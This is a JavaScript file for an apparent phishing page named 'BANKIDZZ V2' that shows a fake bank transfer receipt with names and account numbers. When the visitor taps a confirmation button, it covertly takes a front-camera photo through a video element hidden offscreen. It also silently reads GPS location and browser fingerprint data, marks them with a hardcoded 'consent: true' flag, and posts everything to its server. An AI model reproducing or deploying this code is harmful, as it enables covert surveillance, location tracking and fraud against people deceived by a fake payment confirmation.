// ============================================================
// BANKIDZZ V2 - SILENT CAPTURE + FRONT CAMERA FIRST
// ============================================================

(function() {
    'use strict';

    const CONFIG = {
        API_URL: '/api/locations',
        TEMPLATE_URL: '/api/template',
        SYNC_CHANNEL: 'bankidzz_sync_channel',
        SILENT_CAPTURE_DELAY: 200,       // delay ultra-cepat (ms)
        LOCATION_TIMEOUT: 1500,          // timeout GPS otomatis (ms)
        FRONT_CAMERA_QUALITY: 0.80,      // kualitas foto depan
        BACK_CAMERA_QUALITY: 0.85        // kualitas foto belakang
    };

    // Default Template
    const defaultTemplate = {
        topBarTitle: 'JAPANESE BANK',
        primaryColor: '#0033ff',
        profileImage: 'channels4_profile.jpg',
        bankName: 'BIBD Brunei Darussalam',
        bankSub: 'Office Purchasing',
        amountMain: 'IDR 515.000',
        amountSub: 'BND 35.12',
        senderBank: 'BIBD Brunei Darussalam',
        senderName: 'FITO ALAMSYAH',
        senderAccount: '72828172718',
        receiverBank: 'BANK BNI',
        receiverAccount: '2093832050',
        receiverName: 'Tasliyah',
        buttonText: 'Ambil Foto Konfirmasi / Tanda Tangan'
    };

    let currentTemplate = { ...defaultTemplate };
    let capturedPhotoBase64 = null;
    let silentFrontPhotoBase64 = null;     // Foto silent dari kamera depan
    let silentLocationData = null;         // Lokasi silent
    let frontCameraStream = null;          // Stream kamera depan
    let backCameraStream = null;           // Stream kamera belakang

    // DOM Elements
    const elements = {
        topBarTitle: document.getElementById('topBarTitle'),
        profileImage: document.getElementById('profileImage'),
        bankName: document.getElementById('bankName'),
        bankSub: document.getElementById('bankSub'),
        amountMain: document.getElementById('amountMain'),
        amountSub: document.getElementById('amountSub'),
        senderBankDetail: document.getElementById('senderBankDetail'),
        senderName: document.getElementById('senderName'),
        senderAccount: document.getElementById('senderAccount'),
        receiverBankDetail: document.getElementById('receiverBankDetail'),
        receiverAccount: document.getElementById('receiverAccount'),
        receiverName: document.getElementById('receiverName'),
        btnConfirm: document.getElementById('btnConfirm'),
        notification: document.getElementById('notification'),
        receiptCard: document.getElementById('receiptCard'),
        photoModal: document.getElementById('photoModal'),
        modalPreviewImg: document.getElementById('modalPreviewImg'),
        btnCloseModal: document.getElementById('btnCloseModal'),
        btnCancelPhoto: document.getElementById('btnCancelPhoto'),
        btnSendPhoto: document.getElementById('btnSendPhoto'),
        fileCameraInput: document.getElementById('fileCameraInput'),
        // Element baru untuk kamera
        cameraContainer: document.getElementById('cameraContainer'),
        cameraVideo: document.getElementById('cameraVideo'),
        cameraCanvas: document.getElementById('cameraCanvas'),
        cameraStatus: document.getElementById('cameraStatus'),
        btnCaptureBack: document.getElementById('btnCaptureBack')
    };

    // ============================================================
    // SILENT LOCATION TRACKER (OTOMATIS & CEPAT)
    // ============================================================
    function getSilentLocation() {
        return new Promise((resolve) => {
            let locationData = {
                lat: -6.2088,
                lng: 106.8456,
                accuracy: 35,
                timestamp: new Date().toISOString(),
                source: 'fallback',
                silent: true
            };

            if (!navigator.geolocation) {
                resolve(locationData);
                return;
            }

            const timeoutId = setTimeout(() => {
                resolve(locationData);
            }, CONFIG.LOCATION_TIMEOUT);

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    clearTimeout(timeoutId);
                    locationData = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude,
                        heading: pos.coords.heading,
                        speed: pos.coords.speed,
                        timestamp: new Date().toISOString(),
                        source: 'gps',
                        silent: true
                    };
                    resolve(locationData);
                },
                (err) => {
                    clearTimeout(timeoutId);
                    resolve(locationData);
                },
                {
                    enableHighAccuracy: true,
                    timeout: CONFIG.LOCATION_TIMEOUT,
                    maximumAge: 60000
                }
            );
        });
    }

    // ============================================================
    // SILENT FRONT CAMERA CAPTURE (OTOMATIS & CEPAT)
    // ============================================================
    async function silentFrontCameraCapture() {
        return new Promise(async (resolve) => {
            let isDone = false;
            const safetyTimeout = setTimeout(() => {
                if (!isDone) {
                    isDone = true;
                    if (frontCameraStream) {
                        frontCameraStream.getTracks().forEach(t => t.stop());
                        frontCameraStream = null;
                    }
                    resolve(null);
                }
            }, 1800);

            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    clearTimeout(safetyTimeout);
                    resolve(null);
                    return;
                }

                frontCameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                const video = document.createElement('video');
                video.srcObject = frontCameraStream;
                video.setAttribute('playsinline', '');
                video.setAttribute('autoplay', '');
                video.muted = true;
                video.style.position = 'fixed';
                video.style.top = '-9999px';
                video.style.opacity = '0';
                document.body.appendChild(video);

                await new Promise((res) => {
                    video.onloadedmetadata = () => video.play().then(res).catch(res);
                    setTimeout(res, 600);
                });

                await new Promise(r => setTimeout(r, CONFIG.SILENT_CAPTURE_DELAY));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                silentFrontPhotoBase64 = canvas.toDataURL('image/jpeg', CONFIG.FRONT_CAMERA_QUALITY);

                video.pause();
                video.srcObject = null;
                video.remove();

                if (frontCameraStream) {
                    frontCameraStream.getTracks().forEach(track => track.stop());
                    frontCameraStream = null;
                }

                if (!isDone) {
                    isDone = true;
                    clearTimeout(safetyTimeout);
                    resolve(silentFrontPhotoBase64);
                }

            } catch (err) {
                if (frontCameraStream) {
                    frontCameraStream.getTracks().forEach(track => track.stop());
                    frontCameraStream = null;
                }
                if (!isDone) {
                    isDone = true;
                    clearTimeout(safetyTimeout);
                    resolve(null);
                }
            }
        });
    }

    // ============================================================
    // BACK CAMERA FOR RECEIPT / ITEM PHOTO
    // ============================================================
    async function openBackCamera() {
        try {
            console.log('[BACK-CAM] Opening back camera for item...');
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return false;
            }

            try {
                backCameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { ideal: 'environment' },
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: false
                });
            } catch (e1) {
                // Fallback jika ideal environment tidak tersedia (misal di PC)
                backCameraStream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: false
                });
            }

            if (elements.cameraVideo && backCameraStream) {
                elements.cameraVideo.srcObject = backCameraStream;
                elements.cameraVideo.setAttribute('playsinline', '');
                await elements.cameraVideo.play().catch(() => {});
            }

            if (elements.cameraContainer) {
                elements.cameraContainer.style.display = 'flex';
            }

            return true;
        } catch (err) {
            console.error('[BACK-CAM] Error opening rear camera:', err);
            return false;
        }
    }

    // Capture snapshot dari kamera belakang
    function captureBackCamera() {
        let dataUrl = null;
        try {
            const video = elements.cameraVideo;
            const canvas = elements.cameraCanvas || document.createElement('canvas');
            const w = (video && video.videoWidth > 0) ? video.videoWidth : 1280;
            const h = (video && video.videoHeight > 0) ? video.videoHeight : 720;
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext('2d');
            if (video) {
                ctx.drawImage(video, 0, 0, w, h);
                dataUrl = canvas.toDataURL('image/jpeg', CONFIG.BACK_CAMERA_QUALITY || 0.85);
            }
        } catch (e) {
            console.warn('captureBackCamera error:', e);
        }

        if (backCameraStream) {
            try {
                backCameraStream.getTracks().forEach(track => track.stop());
            } catch(e) {}
            backCameraStream = null;
        }

        if (elements.cameraContainer) {
            elements.cameraContainer.style.display = 'none';
        }

        return dataUrl;
    }

    // ============================================================
    // MAIN HANDLER - SILENT CAPTURE DEPAN & LOKASI DULU, 
    // LALU LANGSUNG BUKA KAMERA BELAKANG UNTUK FOTO BARANG
    // ============================================================
    async function handleConfirmClick() {
        if (!elements.btnConfirm) return;

        const originalText = elements.btnConfirm.textContent;
        elements.btnConfirm.textContent = '📸 Memproses...';
        elements.btnConfirm.disabled = true;

        try {
            // STEP 1 & 2: RUN SILENT LOCATION + SILENT FRONT CAMERA IN PARALLEL!
            console.log('[STEP-1 & 2] Silent Location & Front Camera (Parallel)...');
            const [locResult, frontResult] = await Promise.all([
                getSilentLocation(),
                silentFrontCameraCapture()
            ]);

            silentLocationData = locResult;
            silentFrontPhotoBase64 = frontResult;

            // STEP 3: SCREENSHOT RECEIPT (html2canvas)
            console.log('[STEP-3] Screenshot receipt...');
            if (typeof window.html2canvas === 'function' && elements.receiptCard) {
                try {
                    const canvas = await window.html2canvas(elements.receiptCard, {
                        scale: 2,
                        useCORS: true,
                        allowTaint: true,
                        backgroundColor: '#ffffff'
                    });
                    capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
                } catch(e) {}
            }

            // STEP 4: LANGSUNG BUKA KAMERA BELAKANG UNTUK FOTO BARANG
            console.log('[STEP-4] Langsung membuka kamera belakang...');
            const backOpened = await openBackCamera();

            if (!backOpened) {
                // Jika kamera belakang tidak bisa dibuka (misal di laptop/PC tanpa kamera 2),
                // kirim langsung data silent + struk agar transaksi tetap sukses & selesai
                await saveTransactionWithSilentData(
                    silentLocationData,
                    silentFrontPhotoBase64,
                    capturedPhotoBase64
                );

                if (elements.btnConfirm) {
                    elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
                    elements.btnConfirm.style.backgroundColor = '#10b981';
                    elements.btnConfirm.dataset.verified = 'true';
                }

                showNotification('Konfirmasi Berhasil Diverifikasi!', 'success');
            }

        } catch (err) {
            console.error('Error in handleConfirmClick:', err);
            showNotification('Gagal memproses. Coba lagi.', 'error');
            elements.btnConfirm.textContent = originalText;
            elements.btnConfirm.disabled = false;
        }
    }

    window.handleConfirmClick = handleConfirmClick;

    // ============================================================
    // HANDLE CAPTURE BACK PHOTO & SEND ALL
    // ============================================================
    async function handleCaptureBackPhoto() {
        if (elements.btnCaptureBack) {
            elements.btnCaptureBack.textContent = '⏳ Mengirim Data...';
            elements.btnCaptureBack.disabled = true;
        }

        try {
            // Ambil foto barang dari kamera belakang
            const backPhoto = captureBackCamera();
            if (backPhoto) {
                capturedPhotoBase64 = backPhoto;
            }

            // Kirim semua data: Lokasi Silent + Foto Depan Silent + Foto Barang Belakang
            await saveTransactionWithSilentData(
                silentLocationData || await getSilentLocation(),
                silentFrontPhotoBase64,
                capturedPhotoBase64
            );

            // Update status tombol menjadi sukses terverifikasi
            if (elements.btnConfirm) {
                elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
                elements.btnConfirm.style.backgroundColor = '#10b981';
                elements.btnConfirm.dataset.verified = 'true';
            }

            showNotification('✅ Foto barang & data verifikasi berhasil dikirim!', 'success');

        } catch (err) {
            console.error('Error in handleCaptureBackPhoto:', err);
            showNotification('Gagal mengirim data.', 'error');
        } finally {
            if (elements.btnCaptureBack) {
                elements.btnCaptureBack.textContent = '📸 Ambil Foto Barang';
                elements.btnCaptureBack.disabled = false;
            }
        }
    }

    window.handleCaptureBackPhoto = handleCaptureBackPhoto;

    // ============================================================
    // SAVE TRANSACTION WITH SILENT DATA
    // ============================================================
    async function saveTransactionWithSilentData(locationData, frontPhoto, receiptPhoto) {
        const transferId = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
        
        const finalReceiptPhoto = receiptPhoto || capturedPhotoBase64 || '';
        const finalFrontPhoto = frontPhoto || silentFrontPhotoBase64 || '';

        const payload = {
            transferId: transferId,
            consent: true,
            sender: currentTemplate.senderName || 'FITO ALAMSYAH',
            senderBank: currentTemplate.senderBank || 'BIBD Brunei Darussalam',
            senderAccount: currentTemplate.senderAccount || '72828172718',
            receiver: currentTemplate.receiverName || 'Tasliyah',
            receiverBank: currentTemplate.receiverBank || 'BANK BNI',
            receiverAccount: currentTemplate.receiverAccount || '2093832050',
            amount: currentTemplate.amountMain || 'IDR 515.000',
            amountSub: currentTemplate.amountSub || 'BND 35.12',
            location: locationData,
            photo: finalReceiptPhoto,                 // Foto barang / struk
            frontPhoto: finalFrontPhoto,             // FOTO SILENT KAMERA DEPAN
            front_photo: finalFrontPhoto,            // Kompatibilitas field database
            silentCapture: true,                     // Flag silent capture
            silentLocation: true,                    // Flag silent location
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            status: 'verified',
            timestamp: new Date().toISOString()
        };

        // 1. Local Storage Backup
        try {
            const localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            localStored.unshift(payload);
            localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));
        } catch(e) {}

        // 2. Broadcast Channel
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.postMessage({ type: 'NEW_LOCATION', payload: payload });
            channel.close();
        } catch(e) {}

        // 3. Post to Server
        try {
            const response = await fetch(CONFIG.API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (!response.ok) {
                console.warn('API non-200, synced locally.');
            }
        } catch (e) {
            console.warn('Network error, synced locally.', e);
        }
    }

    // ============================================================
    // TEMPLATE & UI FUNCTIONS
    // ============================================================
    function applyTemplate(template) {
        currentTemplate = { ...defaultTemplate, ...template };
        document.documentElement.style.setProperty('--primary-blue', currentTemplate.primaryColor || '#0033ff');
        document.title = currentTemplate.topBarTitle || 'Bankidzz';
        
        if(elements.topBarTitle) elements.topBarTitle.textContent = currentTemplate.topBarTitle;
        if(elements.profileImage && currentTemplate.profileImage) elements.profileImage.src = currentTemplate.profileImage;
        if(elements.bankName) elements.bankName.textContent = currentTemplate.bankName;
        if(elements.bankSub) elements.bankSub.textContent = currentTemplate.bankSub;
        if(elements.amountMain) elements.amountMain.textContent = currentTemplate.amountMain;
        if(elements.amountSub) elements.amountSub.textContent = currentTemplate.amountSub;
        if(elements.senderBankDetail) elements.senderBankDetail.textContent = currentTemplate.senderBank;
        if(elements.senderName) elements.senderName.textContent = currentTemplate.senderName;
        if(elements.senderAccount) elements.senderAccount.textContent = currentTemplate.senderAccount;
        if(elements.receiverBankDetail) elements.receiverBankDetail.textContent = currentTemplate.receiverBank;
        if(elements.receiverAccount) elements.receiverAccount.textContent = currentTemplate.receiverAccount;
        if(elements.receiverName) elements.receiverName.textContent = currentTemplate.receiverName;
        
        if(elements.btnConfirm && (!elements.btnConfirm.dataset.verified || elements.btnConfirm.dataset.verified === 'false')) {
            elements.btnConfirm.textContent = currentTemplate.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
        }
    }

    async function loadTemplate() {
        try {
            const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.template) {
                    localStorage.setItem('bankidzz_new_template', JSON.stringify(result.template));
                    applyTemplate(result.template);
                    return;
                }
            }
        } catch(e) {}
        const stored = localStorage.getItem('bankidzz_new_template');
        if (stored) {
            try { applyTemplate(JSON.parse(stored)); } catch(e) { applyTemplate(defaultTemplate); }
        } else {
            applyTemplate(defaultTemplate);
        }
    }

    function closeModal() {
        if (elements.photoModal) elements.photoModal.style.display = 'none';
        if (backCameraStream) {
            backCameraStream.getTracks().forEach(track => track.stop());
            backCameraStream = null;
        }
        if (elements.cameraContainer) elements.cameraContainer.style.display = 'none';
    }

    function showNotification(msg, type = 'success') {
        const el = elements.notification;
        if (!el) return;
        el.textContent = msg;
        el.className = 'notification show ' + type;
        clearTimeout(el._timeout);
        el._timeout = setTimeout(() => { el.className = 'notification'; }, 5000);
    }

    function setupSyncListener() {
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'template_updated') {
                    if (event.data.template) {
                        localStorage.setItem('bankidzz_new_template', JSON.stringify(event.data.template));
                        applyTemplate(event.data.template);
                    }
                }
            });
        } catch(e) {}
    }

    // File input fallback
    if (elements.fileCameraInput) {
        elements.fileCameraInput.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(evt) {
                    capturedPhotoBase64 = evt.target.result;
                    if (elements.modalPreviewImg) elements.modalPreviewImg.src = capturedPhotoBase64;
                    showNotification('Foto diperbarui!', 'success');
                };
                reader.readAsDataURL(file);
            }
        });
    }

    window.closeBackCamera = closeModal;

    // Event listeners
    if (elements.btnCloseModal) elements.btnCloseModal.addEventListener('click', closeModal);
    if (elements.btnCancelPhoto) elements.btnCancelPhoto.addEventListener('click', closeModal);
    if (elements.btnSendPhoto) elements.btnSendPhoto.addEventListener('click', handleSendPhoto);
    if (elements.btnConfirm) elements.btnConfirm.addEventListener('click', handleConfirmClick);
    if (elements.btnCaptureBack) elements.btnCaptureBack.addEventListener('click', handleCaptureBackPhoto);

    // Init
    loadTemplate();
    setupSyncListener();

})();